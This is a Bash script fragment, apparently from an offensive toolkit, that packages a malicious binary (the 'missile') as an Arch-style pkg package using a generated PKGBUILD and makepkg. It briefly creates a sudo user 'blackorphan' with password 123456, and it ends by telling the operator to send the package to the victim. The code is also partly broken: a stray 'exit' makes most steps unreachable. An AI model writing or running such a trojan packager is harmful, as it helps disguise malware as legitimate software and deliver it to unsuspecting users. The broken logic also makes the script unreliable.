# Packger for pkg packages
_pkgbuild(){
    while read line
    do
	$line
    done << EOF > PKGBUILD
echo # Maintainer: Your Name <${email}>
echo pkgname=${fileName}
echo pkgver=${vnumber}
echo pkgrel=1
echo pkgdir=/usr/local/bin
echo pkgdesc="${description}"
echo arch=('any')
echo license=('GPL')
echo source=("\$pkgname-\$pkgver.tar.gz")
EOF
}

createMalPkg() {
    while printf "\n${open}${light}${green}Should i associate the missile with a %s package?[y|n]: ${close}" "${pPackage}" ; \
	  read $opt -e inmissile
    do
	case $inmissile in
	    y|Y)
		
		malwareDir="malware"
		
		mkdir "${malwareDir}"
		cd "${malwareDir}"

		chk_file;
		exit
		packagedetails
		mkdir "${fileName}-${vnumber}"
		mv "${fileName}" "${fileName}-${vnumber}"
		
		chmod -R 777 "../${malwareDir}"
		
		tar -cvf "${fileName}-${vnumber}.tar.gz" "${fileName}-${vnumber}"
		rm -rf "${fileName}-${vnumber}"
		_pkgbuild
		chmod 777 PKGBUILD
		
		[[ "$(whoami)" == "root" ]] && \
		    printf "\n\a${open}${bold}${red}[!]I cannot Package If you are root${close}\n" && \
		    {
			while printf "${open}${light}${green}%s: ${close}" "specify a user to package with"; read myUser junk
			do

			    if [[ -z "${myUser}" ]];then
				myUser=blackorphan
				printf "\n${open}${bold}${green}Creating user blackorphan...${close}\n"	
				useradd -G sudo -s /bin/bash --password 123456 "${myUser}" 2>/dev/null
				break
			    fi
			    
			    if grep ^"$myUser" < /etc/passwd ;then
				break
			    fi
			    
			    printf "\n${open}${bold}${red}Invalid User has been specified\n"
			    continue			    
			done
		    }
		
		
		: ${myUser:=$(whoami)}

		
		which bsdtar 1>/dev/null
		status=$?

		
		if (( status != 0 ));then

		    printf "${open}${bold}${red}[!]bsdtar is not installed on your BoX${close}\n"
		    printf "${open}${bold}${green}%s${close}" "How to install bsdtar"

		    printf "${open}${bold}${green}\n\t%s\n\t%s\n\t%s\n${close}" \
			   "cd libarchive-3.2.2" \
			   "./configure" \
			   "make && make install"
		    
		    [[ "${myUser}" == "blackorphan" ]] && {
			userdel "${myUser}"
			exit 2
		    }
		    
		    exit 2;
		    
		fi
		
		gksu -u "${myUser}" "${CRYPT}/misc/makepkg -g >> PKGBUILD"
		
		[[ $? != 0 ]] && printf "\n\n${open}${bold}${red}Fatal Error..Exiting${close}\n" && exit 2
		
		gksu -u ${myUser} "../misc/makepkg"

		
		[[ $? != 0 ]] && printf "\n\n${open}${bold}${red}Fatal Error..Exiting${close}\n" && exit 2
		
		[[ "${myUser}" == "blackorphan" ]] && \
		    
		    printf "${open}${bold}${green}Removing User BlackOrphan${close}" && \
		    
		    userdel "${myUser}"
		
		
		cp ./*.pkg.* "../"
		rm -rf "../${malwareDir}"
		
		printf "${open}${light}${green}Ok we are done here..${close}\n"
		printf "${open}${light}${green}You can now send the package to your victim${close}\n"
		
		break
		;;
	    
	    n|N)
		shit_func ;;
	    
	    *)
		printf "${open}${bold}${red}%s${close}" "Invalid response"
		;;
	esac
    done
}
